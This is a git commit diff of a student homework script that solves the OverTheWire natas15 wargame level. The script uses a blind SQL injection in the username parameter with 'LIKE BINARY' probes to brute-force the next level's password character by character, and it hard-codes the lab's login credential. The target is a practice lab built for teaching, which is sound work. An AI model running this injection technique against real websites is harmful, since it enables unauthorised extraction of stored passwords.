7b2c6785845d97cdbacdad4f5cbe4439ccf2237b
Andrew <aoleksy@mail.depaul.edu>
2018-04-16 18:11:21 -0500

    Update scripty.py

--- scripty.py
+++ scripty.py
@@ -1,33 +1,30 @@
-#from requests import *
+###################### Andrew Oleksy Adv Cyber Security Automation ######################
+###################################### Homework 2 #######################################
 import requests,string
-
-
-
-
 
 a15usn = "natas15"
 a15pass = 'AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J'
-url = "http://natas15.natas.labs.overthewire.org/"
-    
-chars = 'aAbBcCdDeEfFgGhHiIjJkKlLmMnNoOpPqQrRsStTuUvVwWxXyYzZ1234567890'
-
-passdict = []
-msg = "This user exists."
-    
-for char in chars:
-    passlooker = ''.join([url, '?', 'username=natas16"', '+and+password+LIKE+BINARY+"%', char, '%', '&debug'])
-    requestcheck = requests.get(passlooker, auth = (a15usn, a15pass))
-    if msg in requestcheck.text:
-		passdict.append(char)
-		
-print("Dictionary is built")
-print("Time to brute force :^)")
 
 a16list = []
 a16pass = ''
 
+url = "http://natas15.natas.labs.overthewire.org/"
+
+chars = 'aAbBcCdDeEfFgGhHiIjJkKlLmMnNoOpPqQrRsStTuUvVwWxXyYzZ1234567890'
+
+passdict = []
+
+for char in chars:
+    passlooker = ''.join([url, '?', 'username=natas16"', '+and+password+LIKE+BINARY+"%', char, '%', '&debug'])
+    requestcheck = requests.get(passlooker, auth = (a15usn, a15pass))
+    if "This user exists" in requestcheck.text:
+                passdict.append(char)
+
+print("Dictionary is built")
+print("Time to brute force :^)")
+
 for i in range(0, 64):
-        
+
     for char in passdict:
 
         posspass = ''.join([a16pass,char])
@@ -36,9 +33,10 @@ for i in range(0, 64):
 
         requestcheck = requests.get(passlooker, auth = (a15usn, a15pass))
 
-        if msg in requestcheck.text:
+        if "This user exists." in requestcheck.text:
             a16list.append(char)
 
             a16pass = ''.join(a16list)
-                
+
             print("length: {0}, password: {1}").format(len(a16pass), a16pass)
+
